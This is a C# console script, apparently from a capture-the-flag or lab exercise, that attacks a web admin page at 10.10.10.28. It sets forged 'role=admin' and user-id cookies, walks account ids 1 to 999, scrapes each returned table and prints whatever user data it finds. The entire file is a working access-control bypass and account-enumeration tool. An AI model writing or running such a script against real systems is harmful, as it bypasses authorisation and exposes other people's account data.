using HtmlAgilityPack;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace WebSiteUrlScrapper
{
    class Program
    {
        static void Main(string[] args)
        {
            // For loop for 1000 id. Shhould be enough can increase if needed
            for(var i = 1; i < 1000; i++)
            {
                // set URL we are attacking with loop indicator i for id
                var url = "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=" + i;

                // Create Web Request
                HttpWebRequest rq = (HttpWebRequest)WebRequest.Create(url);

                // Create Cookie Container
                rq.CookieContainer = new CookieContainer();
                
                // Set Cookies for Request
                rq.CookieContainer.Add(new Cookie("role", "admin", "/", "10.10.10.28"));
                rq.CookieContainer.Add(new Cookie("user", "34322", "/", "10.10.10.28"));

                // fetch url and get Response
                HttpWebResponse resp = (HttpWebResponse)rq.GetResponse();

                // If response is ok continue with the request, let filter some html
                if (resp.StatusCode == HttpStatusCode.OK)
                {
                    //we have a valid hit, lets recieve the stream and check out the html
                    Stream receiveStream = resp.GetResponseStream();

                    // Set Stream Reader
                    StreamReader readStream;

                    // Check Web Response for white space or null value in the character set if there is none then Continue 
                    if (!String.IsNullOrWhiteSpace(resp.CharacterSet))
                    {
                        // Read Response
                        readStream = new StreamReader(receiveStream, Encoding.GetEncoding(resp.CharacterSet));

                        // Get Hteml to data string
                        string data = readStream.ReadToEnd();

                        // Create a html document with HTML Agility Pack
                        HtmlDocument doc = new HtmlDocument();

                        // Load Data into html doc
                        doc.LoadHtml(data);

                        // Find all html with td because we are looking at td in a table for data
                        HtmlNodeCollection col = doc.DocumentNode.SelectNodes("//td");

                        // Set user string this will be a strign to output the data
                        var user = "";

                        // loop through node collection and add innerhtml to string
                        foreach (HtmlNode node in col)
                        {
                            // Add InnerHtml to user string
                            user += node.InnerHtml + " ";
                        }

                        // Check and see if user string contains data Remove White spaces from user string then length check
                        // if Greater then 1 then we have data
                        if (Regex.Replace(user, @"\s+", "").Length > 1)
                        {
                            // Out put url and user info that this app hit/ found
                            Console.WriteLine(" ");
                            Console.WriteLine(url);
                            Console.WriteLine(user);
                        }

                        // Close Response and Stream
                        resp.Close();
                        readStream.Close();
                    }
                }
            }
            // Read so console app doesnt close after finishing
            Console.ReadLine();
        }
    }
}
